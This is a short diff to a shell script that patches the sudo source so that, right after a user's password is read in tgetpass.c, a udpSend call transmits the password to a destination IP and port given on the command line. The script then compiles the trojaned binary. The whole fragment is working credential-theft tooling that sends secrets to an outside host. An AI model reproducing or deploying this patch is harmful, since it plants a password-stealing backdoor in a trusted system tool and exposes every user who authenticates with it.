@@ -24,7 +24,7 @@ DEST_IP=$1
 PORT=$2
 dir="sudo-SUDO_$SUDO_VERSION/src/tgetpass.c"
 
-PAYLOAD="udpSend(pass, ${PORT}, \"${DEST_IP}\");"
+PAYLOAD="udpSend(pass, ${PORT}, \"${DEST_IP}\", \"sudo\");"
 match='pass = getln(input, buf, sizeof(buf), feedback, &errval);'
 
 sed -i "/$match/a$PAYLOAD" $dir
@@ -34,5 +34,5 @@ cd sudo-SUDO_$SUDO_VERSION
 
 ./configure
 make
-cp src/sudo ../
-cd ../ && rm -r sudo-SUDO_$SUDO_VERSION
+# make install
+# cd ../ && rm -r sudo-SUDO_$SUDO_VERSION
